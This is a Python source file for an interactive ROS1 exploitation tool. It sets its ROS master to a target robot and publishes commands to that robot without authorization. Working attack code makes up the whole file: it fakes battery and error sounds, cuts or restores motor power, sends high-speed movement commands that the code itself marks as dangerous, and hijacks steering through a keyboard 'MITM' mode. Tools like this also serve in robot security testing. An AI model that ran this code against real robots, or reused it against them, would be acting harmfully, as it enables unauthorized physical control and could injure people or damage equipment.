#!/usr/bin/env python3

import logging
import os
import sys
import time
from termcolor import colored, cprint

from modulesROS1.toolbox import network

class ROSToolbox:
    """
    Functions based on native ROS1 commands
    """

    def __init__(self, target_host, port):
        self.logger = logging.getLogger(__name__)
        self.target_host = target_host
        self.port = port

        self.interface = network.InterfaceScanner().networkInterface('inject')
        self.attacker_host = network.IPScanner(self.interface).ip


    def exportEnvironment(self):
        """ source ROS environment """

        os.environ['ROS_MASTER_URI'] = 'http://{}:{}'.format(self.target_host, str(self.port))
        os.environ['ROS_HOSTNAME'] = '{}'.format(self.attacker_host)


    def vulnTopicsACI(self, exploitable_topic):
        """ publishing to ROS topics """

        print()
        if exploitable_topic == '/sound':
            while True:
                cprint("[!] Exploitation options for topic: /sound", 'white', attrs=['bold'])
                cprint("  [1] Execute low battery notification sound\n"
                       "  [2] Execute system error notification sound", 'white')

                try:
                    option = int(input("Select option: "))
                    if option == 1:
                        os.system('rostopic pub --once /sound turtlebot3_msgs/Sound "value: 2"')
                        os.system('clear')
                        cprint("[+] Published low battery notification to target system", 'green', attrs=['bold'])
                        break
                    elif option == 2:
                        os.system('rostopic pub --once /sound turtlebot3_msgs/Sound "value: 3"')
                        os.system('clear')
                        cprint("[+] Published error notification to target system", 'green', attrs=['bold'])
                        break
                    else:
                        sys.stdout.write(colored("\r[!] Invalid input", 'red'))
                        time.sleep(1.5)
                        sys.stdout.flush()
                except ValueError:
                    sys.stdout.write(colored("\r[!] Invalid input", 'red'))
                    time.sleep(1.5)
                    sys.stdout.flush()

        elif exploitable_topic == '/motor_power':
            while True:
                cprint("[!] Exploitation options for topic: /motor_power", 'white', attrs=['bold'])
                cprint("  [1] Turn motor power off\n"
                       "  [2] Turn motor power on", 'white')

                try:
                    option = int(input("Select option: "))
                    if option == 1:
                        os.system('rostopic pub --once /motor_power std_msgs/Bool "data: false"')
                        os.system('clear')
                        cprint("[+] Published motor power OFF command to target system", 'green', attrs=['bold'])
                        break
                    elif option == 2:
                        os.system('rostopic pub --once /motor_power std_msgs/Bool "data: true"')
                        os.system('clear')
                        cprint("[+] Published motor power ON command to target system", 'green', attrs=['bold'])
                        break
                    else:
                        sys.stdout.write(colored("\r[!] Invalid input", 'red'))
                        time.sleep(1.5)
                        sys.stdout.flush()
                except ValueError:
                    sys.stdout.write(colored("\r[!] Invalid input", 'red'))
                    time.sleep(1.5)
                    sys.stdout.flush()

        elif exploitable_topic == '/cmd_vel':
            while True:
                cprint("[!] Exploitation options for topic: /cmd_vel", 'white', attrs=['bold'])
                cprint("  [1] Stop robot movement\n"
                       "  [2] Move robot forward (high speed) (dangerous action!)\n"
                       "  [3] Move robot backwards (high speed) (dangerous action!)\n"
                       "  [4] Rotate robot (high speed) (dangerous action!)", 'white')

                try:
                    option = int(input("Select option: "))
                    if option == 1:
                        os.system('rostopic pub --once /cmd_vel geometry_msgs/Twist '
                                  '"{linear: {x: 0.00, y: 0.0, z: 0.0}, angular: {x: 0.0, y: 0.0, z: 0.0}}"')
                        os.system('clear')
                        cprint("[+] Published stop command to target system", 'green', attrs=['bold'])
                        break
                    elif option == 2:
                        os.system('rostopic pub --once /cmd_vel geometry_msgs/Twist '
                                  '"{linear: {x: 0.25, y: 0.0, z: 0.0}, angular: {x: 0.0, y: 0.0, z: 0.0}}"')
                        os.system('clear')
                        cprint("[+] Published forward command to target system", 'green', attrs=['bold'])
                        break
                    elif option == 3:
                        os.system('rostopic pub --once /cmd_vel geometry_msgs/Twist '
                                  '"{linear: {x: -0.25, y: 0.0, z: 0.0}, angular: {x: 0.0, y: 0.0, z: 0.0}}"')
                        os.system('clear')
                        cprint("[+] Published backward command to target system", 'green', attrs=['bold'])
                        break
                    elif option == 4:
                        os.system('rostopic pub --once /cmd_vel geometry_msgs/Twist '
                                  '"{linear: {x: 0.00, y: 0.0, z: 0.0}, angular: {x: 0.0, y: 0.0, z: 1.8}}"')
                        os.system('clear')
                        cprint("[+] Published rotate command to target system", 'green', attrs=['bold'])
                        break
                    else:
                        sys.stdout.write(colored("\r[!] Invalid input", 'red'))
                        time.sleep(1.5)
                        sys.stdout.flush()
                except ValueError:
                    sys.stdout.write(colored("\r[!] Invalid input", 'red'))
                    time.sleep(1.5)
                    sys.stdout.flush()


    def keyboardMITM(self):
        """ Remote Control options """

        key_mapping = {'w': '"{linear: {x: 0.05, y: 0.0, z: 0.0}, angular: {x: 0.0, y: 0.0, z: 0.0}}"',
                       's': '"{linear: {x: -0.05, y: 0.0, z: 0.0}, angular: {x: 0.0, y: 0.0, z: 0.0}}"',
                       'a': '"{linear: {x: 0.00, y: 0.0, z: 0.0}, angular: {x: 0.0, y: 0.0, z: 0.2}}"',
                       'd': '"{linear: {x: 0.00, y: 0.0, z: 0.0}, angular: {x: 0.0, y: 0.0, z: -0.2}}"',
                       'x': '"{linear: {x: 0.00, y: 0.0, z: 0.0}, angular: {x: 0.0, y: 0.0, z: 0.0}}"'}

        os.system('clear')
        cprint("RC KEYBOARD USAGE:", 'white', attrs=['bold'])
        cprint("\n[w]: forward\n"
               "[s]: backward\n"
               "[a]: left spin\n"
               "[d]: right spin\n"
               "[x]: stop\n"
               "\n[r]: exit RC keyboard", 'white')

        self.exportEnvironment()
        while True:
            command = str(input("\nSelect drive option: "))
            if command.lower() not in ['w', 's', 'a', 'd', 'x', 'r']:
                sys.stdout.write(colored("\r[!] Invalid input", 'red'))
                time.sleep(0.5)
                sys.stdout.flush()
            elif command.lower() == 'r':
                cprint('[!] Shutting down multiple exploit processes..', 'white')
                return
            else:
                for key, move in key_mapping.items():
                    if command.lower() == key:
                        os.system('rostopic pub --once /cmd_vel geometry_msgs/Twist ' + move)